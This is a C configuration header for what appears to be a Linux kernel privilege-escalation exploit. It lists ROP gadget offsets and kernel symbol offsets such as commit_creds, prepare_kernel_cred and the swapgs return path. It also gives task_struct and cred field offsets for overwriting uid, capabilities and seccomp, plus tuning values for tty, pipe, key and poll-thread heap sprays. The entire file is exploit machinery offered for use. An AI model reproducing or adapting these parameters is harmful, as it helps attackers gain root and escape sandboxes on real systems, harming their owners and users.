#ifndef CONFIG_H
#define CONFIG_H

/* select which variant of the exploit to build */
#define RW_VARIANT 1

#ifdef RW_VARIANT
#define VARIANT "RW_VARIANT"
#else
#define VARIANT "ROP_VARIANT"
#endif // RW_VARIANT

// offset of arbitrary free of pipe_buffer
#ifdef RW_VARIANT
#define KM1k_OFFSET 0x0
#else
#define KM1k_OFFSET 0x8
#endif // RW_VARIANT

#define MAX_POLL_THREAD		0x1000

/* ROP */
// needed to make the allocation land in kmalloc-1k
//#define ROP_DEBUG
#define MIN_ROP_CHAIN_LEN	((0x400 / 2) - 0x18 + 0x8)
#define MAX_ROP_CHAIN_LEN	(0x400 - 0x18)
#define ROP_STACK_SZ	(0x8 * 0x1000)

#define ADD_RSP_0X18_RET (0x023d01 | ROP_NEED_RB_K)
#define MOV_RSP_RCX_POP_RBX_POP_R14_POP_R15_POP_RBP_RET (0xa1af58 | ROP_NEED_RB_K)
#define POP_RDI_RET (0x5C0 | ROP_NEED_RB_K)
#define ADD_RAX_RDI_RET (0x15B0D6 | ROP_NEED_RB_K)
#define PUSH_RAX_POP_RBX_RET (0xF757F | ROP_NEED_RB_K)
#define MOV_QWORD_PTR_RBX_RAX_POP_RBX_RET (0x1084 | ROP_NEED_RB_K)
#define RET (0x1EC | ROP_NEED_RB_K)
#define ADD_RCX_RBX_MOV_RAX_RCX_POP_RBX_RET (0x56457 | ROP_NEED_RB_K)
#define POP_RCX_RET (0x14041 | ROP_NEED_RB_K)
#define ADD_RDI_RCX_MOV_RAX_RDI_RET (0x65811 | ROP_NEED_RB_K)

#define PREPARE_KERNEL_CRED (0x102BE0 | ROP_NEED_RB_K)
#define COMMIT_CREDS (0x102820 | ROP_NEED_RB_K)
#define BPF_GET_CURRENT_TASK (0x1CFC70 | ROP_NEED_RB_K)
#define INIT_FS (0x1580380 | ROP_NEED_RB_K)
#define COPY_FS_STRUCT (0x326220 | ROP_NEED_RB_K)
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE (0xC00EF0 | ROP_NEED_RB_K)

/* leaking */
#define PROC_SINGLE_SHOW_PGOFF 0x310
#define PROC_SINGLE_SHOW_BOFF 0x367310
#define TTY_FILES_SOFF 0x268

/* arb rw */
//#define RW_PITY_DEBUG
#define ANON_PIPE_BUF_OPS 0x1026100UL
#define RW_PITY_INIT_FS 0x1580380UL

#define TASK_STRUCT_COMM_OFFSET 0x6b0UL
#define TASK_STRUCT_CRED_OFFSET 0x6a0UL
#define TASK_STRUCT_FS_OFFSET 0x6e0UL
#define TASK_STRUCT_NSPROXY_OFFSET 0x6f0UL
#define TASK_STRUCT_SECCOMP_OFFSET 0x768UL
#define TASK_STRUCT_THREAD_INFO_OFFSET 0x0UL

#define TASK_STRUCT_ALIGN 0x7FLU

#define CRED_CAP_INHERITABLE_OFFSET 0x38UL
#define CRED_JIT_KEYRING_OFFSET 0x60UL
#define CRED_SECUREBITS_OFFSET 0x34UL
#define CRED_UID_OFFSET 0x14UL

/*----------------------------------------------------------------------
 * Parameters for fine tuning the various sprays
 */
#define N_SLOTS_KM32 0x80
#define N_SLOTS_KM1k 0x10
#define N_SLOTS_KM4k 0x8

#define N_DEFRAGMENT_KM32 (0x8 * N_SLOTS_KM32)
#define N_DEFRAGMENT_KM1k (0x8 * N_SLOTS_KM1k)
#define N_DEFRAGMENT_POLL_THREADS (0x4 * N_SLOTS_KM4k)
#define DEFRAGMENT_POLL_THREAD_TIMEOUT 1000

#define N_2ndSTAGE_POLL_THREADS N_SLOTS_KM32
#define T_2ndSTAGE_POLL_THREADS 9000

#define N_SLOW_POLL_THREADS (N_SLOTS_KM4k - 1)
#define SLOW_POLL_THREAD_TIMEOUT 6000

#define FAST_POLL_THREAD_ID 0x800
#define FAST_POLL_THREAD_TIMEOUT 1000

// as S 9 requires reclaiming seq_operations with user_key_payload
// it makes no sense to choose this larger than the max number of
// keys we can spray (0xc8)
#define N_SPRAY_SEQ_OPS N_SLOTS_KM32

#define N_SPRAY_TTY (N_SLOTS_KM32 / 2)

// number of tty to free before reclaiming with pipes
#define CHUNK_REPLACE_TTY 0x8
// number of pipes to spray for each freed tty
#define CHUNK_FACTOR_PIPE 0x3

#define N_SPRAY_PIPE CHUNK_FACTOR_PIPE * N_SPRAY_TTY

// system hard limit for number of user keys
#define MAX_KEYS 200
// system hard limit for number of user key bytes
#define MAX_KEY_BYTES 20000
// number of threads that spray key objects into kmalloc32
#define N_KEY_THREADS 1
// number of xattr to spray for each key
#define F_XATTR_SPRAY 0x1
// division of the spray into chunks
#define KEY_CHUNK_SZ 0x20
// # keys that each tread sprays, for S 9 we must reclaim seq_operations
// with keys so we have to spray at least that many, also note the limit
// of 0xc8 above
// alloc the key that will be arbitrarily freed due to initial memory
// corruption
#define N_KEYS (N_SLOTS_KM32 - N_SLOW_POLL_THREADS)
// alloc the key that will lead to arbitrary free of pipe_buffer
#define N_KEYS_2 (MAX_KEYS - 0x8)

// size of the kernel buffer that holds the ROP chain
#define ROP_CHAIN_KBUF_SZ (rop_chain_len < min_rop_chain_len ? min_rop_chain_len : rop_chain_len)

// we will maybe run into some limit but we don't care at this
// point
#define N_KEYS_3 (MAX_KEY_BYTES / ROP_CHAIN_KBUF_SZ)

// how many tty_write buffers to spray for reclaiming the pipe_buffer
// array
#define N_RW_PTMX (0x2 * N_SLOTS_KM1k)

#endif // CONFIG_H
